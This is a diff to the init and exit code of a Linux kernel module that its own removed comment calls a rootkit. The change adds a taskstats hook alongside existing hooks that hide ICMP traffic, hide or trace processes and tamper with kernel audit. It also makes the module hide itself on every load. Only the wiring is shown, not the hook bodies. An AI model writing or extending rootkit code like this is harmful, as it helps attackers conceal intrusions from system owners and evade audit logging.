@@ -15,12 +15,7 @@
 #include "include/icmp.h"
 #include "include/trace.h"
 #include "include/audit.h"
-
-/*
-You loaded the world's strongest rootkit into my heart... woman, you are so beautiful and gentle, you changed my life, I love you <3
-
-More love and less war
-*/
+#include "include/task.h"
 
 static int __init singularity_init(void) {
     int ret = 0;
@@ -39,7 +34,8 @@ static int __init singularity_init(void) {
     ret |= hiding_icmp_init();
     ret |= trace_pid_init();
     ret |= hooking_audit_init();
-    module_hide_current(); // optional
+    ret |= taskstats_hook_init();
+    module_hide_current();
     return ret;
 }
 
@@ -59,6 +55,7 @@ static void __exit singularity_exit(void) {
     hiding_icmp_exit();
     trace_pid_cleanup();
     hooking_audit_exit();
+    taskstats_hook_exit();
 }
 
 module_init(singularity_init);
